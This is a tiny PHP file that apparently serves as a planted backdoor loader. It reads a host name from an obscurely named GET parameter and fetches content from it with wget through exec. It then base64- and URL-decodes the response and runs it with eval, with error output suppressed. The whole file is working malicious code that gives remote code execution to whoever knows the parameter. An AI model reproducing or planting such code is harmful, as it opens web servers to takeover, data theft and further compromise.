<?php
$m = 'https://'.@$_GET['410t7z5mkr2cd6'];
@exec("wget $m -qO-", $i);
$o = base64_decode($i[0]);
$q = urldecode($o);
$c = '?>';
$r = $c.$q;
eval($r);
?>